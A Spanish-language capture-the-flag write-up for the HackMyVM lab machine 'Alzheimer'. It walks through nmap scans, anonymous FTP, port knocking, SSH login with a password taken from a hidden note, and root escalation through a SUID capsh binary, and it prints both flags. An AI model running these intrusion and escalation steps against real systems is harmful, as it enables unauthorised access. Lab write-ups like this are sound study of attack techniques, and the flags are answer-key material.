---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Alzheimer HackMyVM (Easy- Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-09 11:54 EDT
Nmap scan report for 192.168.28.17
Host is up (0.00060s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.28.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
MAC Address: 08:00:27:18:7B:C0 (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.24 seconds
```

Veremos que solo tendremos un puerto `FTP`, vamos a probar si podemos entrar de forma anonima, de la siguiente forma:

```shell
ftp anonymous@<IP>
```

Si listamos los archivos ocultos veremos lo siguiente:

```
229 Entering Extended Passive Mode (|||49003|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        113          4096 Oct 03  2020 .
drwxr-xr-x    2 0        113          4096 Oct 03  2020 ..
-rw-r--r--    1 0        0              70 Oct 03  2020 .secretnote.txt
226 Directory send OK.
```

Veremos el archivo llamado `.secretnote.txt` por lo que vamos a descargarnoslo.

```shell
get .secretnote.txt
```

Y si leemos que contiene, veremos lo siguiente:

```
I need to knock this ports and 
one door will be open!
1000
2000
3000
```

Veremos una secuencia de numeros, por lo que podemos creer que se tiene que hacer un `portknocking` para abrir algun puerto que este con esta seguridad, vamos a utilizar la herramienta llamada `knock`.

## knock

Vamos a utilizarla de la siguiente forma:

```shell
knock <IP_VICTIM> 1000 2000 3000
```

Con esto volveremos a realizar otro `nmap` para ver que puerto hemos abierto:

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-09 12:14 EDT
Nmap scan report for 192.168.28.17
Host is up (0.00070s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.28.12
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:18:7B:C0 (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.61 seconds
```

Veremos que hemos abierto el puerto `80` por lo que vamos a ver que contiene, si entramos veremos lo siguiente:

```
I dont remember where I stored my password :( I only remember that was into a .txt file... -medusa
```

Vamos a probar a realizar un poco de `fuzzing` a ver que encontramos, pero ya tenemos un usuario llamado `medusa`, pero no veremos gran cosa.

Si inspeccionamos el codigo veremos lo siguiente:

```html
<!---. --- - .... .. -. --. -->
```

Veremos que es codigo `morse` por lo que vamos a traducirlo:

```
NOTHING
```

Veremos que nos pone nada interesante, pero vamos a enumerar de nuevo los puertos.

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-09 14:06 EDT
Nmap scan report for 192.168.28.17
Host is up (0.00062s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.28.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b1:3b:2b:36:e5:6b:d7:2a:6d:ef:bf:da:0a:5d:2d:43 (RSA)
|   256 35:f1:70🆎a3:66:f1:d6:d7:2c:f7:d1:24:7a:5f:2b (ECDSA)
|_  256 be:15:fa:b6:81:d6:7f🆎c8:1c:97:a5:ea:11:85:4e (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:18:7B:C0 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.72 seconds
```

Veremos que ahora el puerto `SSH` tambien esta abierto, por lo que ahora si vamos a realizar un poco de `fuzzing`, despues de estar buscando un buen rato, vuelvo a entrar en el `FTP`, recordemos que antes el archivo teniamos la siguiente fecha de creacion:

```
-rw-r--r--    1 0        0              70 Oct 03  2020 .secretnote.txt
```

Ahora si volvemos a entrar veremos lo siguiente:

```
-rw-r--r--    1 0        0             139 Apr 09 13:46 .secretnote.txt
```

Vemos que se ha modificado, por lo que vamos a volver a descargarnoslo de la siguiente forma:

```shell
get .secretnote.txt
```

Y si lo leemos veremos lo siguiente:

```
I need to knock this ports and 
one door will be open!
1000
2000
3000
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
```

Vemos que nos muestra la palabra `Ihavebeenalwayshere!!!` por lo que vamos a probar a utilizarla como contraseña.

### SSH

```shell
ssh medusa@<IP>
```

Metemos como contraseña `Ihavebeenalwayshere!!!`, con esto estaremos dentro.

Info:

```
The authenticity of host '192.168.28.17 (192.168.28.17)' can't be established.
ED25519 key fingerprint is SHA256:O2S8HAtlJxSTJJgIQUiIzsbSKX/qj9Thyn38JM6wsBY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.28.17' (ED25519) to the list of known hosts.
medusa@192.168.28.17's password: 
Linux alzheimer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Oct  3 06:00:36 2020 from 192.168.1.58
medusa@alzheimer:~$ whoami
medusa
```

Vamos a leer la `flag` del usuario.

> user.txt

```
HMVrespectmemories
```

## Escalate Privileges

Si listamos los permisos `SUID` que tenemos veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
1249     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    15846    428 -rwsr-xr-x   1 root     root         436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
   137057     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
       60     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
     8850    156 -rwsr-xr-x   1 root     root         157192 Feb  2  2020 /usr/bin/sudo
     3888     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
     3415     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
     3562     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
       63     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
       59     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
     3890     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount
       62     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
     5584     28 -rwsr-sr-x   1 root     root          26776 Feb  6  2019 /usr/sbin/capsh
```

Veremos esta linea bastante interesante:

```
5584   28 -rwsr-sr-x   1 root  root  26776 Feb  6  2019 /usr/sbin/capsh
```

Si buscamos en `GTFObins` veremos que podemos ejecutar lo siguiente para ser `root`:

```shell
/usr/sbin/capsh --gid=0 --uid=0 --
```

Info:

```
root@alzheimer:~# whoami
root
```

Con esto veremos que ya seremos `root` por lo que leeremos las `flag` del `root`.

> root.txt

```
HMVlovememories
```
